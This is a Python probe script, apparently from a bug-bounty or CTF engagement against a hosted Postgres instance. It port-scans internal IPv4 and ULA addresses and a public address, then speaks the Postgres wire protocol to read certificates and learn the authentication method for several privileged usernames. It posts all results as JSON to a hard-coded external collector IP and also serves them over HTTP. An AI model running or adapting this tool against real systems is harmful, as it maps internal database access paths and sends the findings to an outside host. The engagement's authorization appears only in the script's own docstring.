#!/usr/bin/env python3
"""probe24 - the re-provisioned CTF instance's internal addresses (10.1.0.33, new ULA).

The new certificate (CN=falcon-bug-bounty-flag-pgsql-7, Project CA GEN 2) names:
  10.1.0.33
  fda7:a938:5bfe:5fa6:0:5ea:e765:bb97
  n-falcon-bug-bounty-flag-pgsql-7.e.aivencloud.com
  129.213.46.149  (public, confirmed live from outside)
Previous instance had 10.1.8.115 / …:5e9:cd8f:2191 - both dead. These new ones were never tested, and the
old ones answered only with refusals from a container. If an internal address exposes the Postgres port
directly (5432) with an internal-only hba rule, that is the difference between "one public door" and "a
direct path to the database".

In scope (the engagement's target service). Identification only: connect, read certificate, read the
first authentication request. No passwords submitted.
"""
from __future__ import annotations

import base64
import hashlib
import json
import socket
import ssl
import struct
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt24"
UA = "aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)"
TARGETS = [("v4-internal", "10.1.0.33"), ("ula-internal", "fda7:a938:5bfe:5fa6:0:5ea:e765:bb97"),
           ("public(control)", "129.213.46.149")]
PORTS = [22, 80, 443, 5432, 6432, 12691, 12692, 14857, 14858, 9701, 9680, 21911, 21912]
USERS = ["avnadmin", "_aiven", "postgres", "ctf"]
RESULTS = {"stage": "init", "scan": {}, "ident": {}, "auth": {}, "resolved_names": {}}


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps(RESULTS).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def tcp(host, port, timeout=4.0):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        return "open", int((time.time() - t0) * 1000)
    except socket.timeout:
        return "timeout", int((time.time() - t0) * 1000)
    except OSError as e:
        return type(e).__name__.replace("Error", ""), int((time.time() - t0) * 1000)
    finally:
        try:
            s.close()
        except Exception:
            pass


def probe(host, port, user="avnadmin", db="defaultdb"):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    out = {}
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(8)
        s.connect((host, port))
        s.sendall(struct.pack("!ii", 8, 80877103))
        r = s.recv(1)
        out["ssl"] = repr(r)
        if r != b"S":
            s.close()
            return out
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=host)
        der = t.getpeercert(binary_form=True)
        out["cert"] = hashlib.sha256(der).hexdigest()[:16]
        out["der_b64"] = base64.b64encode(der).decode() if port == 12691 and user == "avnadmin" else None
        body = struct.pack("!i", 196610)
        for k, v in (("user", user), ("database", db), ("application_name", "aiven-bugbounty/1.0")):
            body += k.encode() + b"\x00" + v.encode() + b"\x00"
        body += b"\x00"
        t.sendall(struct.pack("!i", len(body) + 4) + body)
        h = t.recv(5)
        n = struct.unpack("!i", h[1:5])[0]
        p = b""
        while len(p) < n - 4:
            c = t.recv(n - 4 - len(p))
            if not c:
                break
            p += c
        t.close()
        if h[:1] == b"R":
            code = struct.unpack("!i", p[:4])[0]
            out["auth"] = {0: "TRUST(none required)", 3: "CLEARTEXT", 5: "MD5", 10: "SCRAM", 7: "GSS"}.get(code, "code=%d" % code)
        elif h[:1] == b"E":
            m = p.split(b"M", 1)[1].split(b"\x00", 1)[0].decode("latin1") if b"M" in p else "?"
            out["auth"] = "FATAL: " + m[:70]
        else:
            out["auth"] = "msg=%r" % h[:1]
    except Exception as e:                                              # noqa: BLE001
        out["error"] = type(e).__name__
    if not out.get("der_b64"):
        out.pop("der_b64", None)
    return out


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", 8080), H).serve_forever(), daemon=True).start()
time.sleep(2)

for label, host in TARGETS:
    RESULTS["scan"][label] = {}
    for p in PORTS:
        st, ms = tcp(host, p)
        if st == "open":
            RESULTS["scan"][label][p] = ms
    for p in sorted(RESULTS["scan"][label]):
        if p in (22, 80, 443):
            RESULTS["ident"]["%s:%d" % (label, p)] = "open (non-PG)"
            continue
        RESULTS["ident"]["%s:%d" % (label, p)] = probe(host, p)
        for u in USERS:
            for db in ("defaultdb", "_aiven"):
                RESULTS["auth"]["%s:%d/%s@%s" % (label, p, u, db)] = probe(host, p, u, db).get("auth", "?")

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RESULTS).encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=25)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print("posted", len(json.dumps(RESULTS)), "bytes")
while True:
    time.sleep(60)
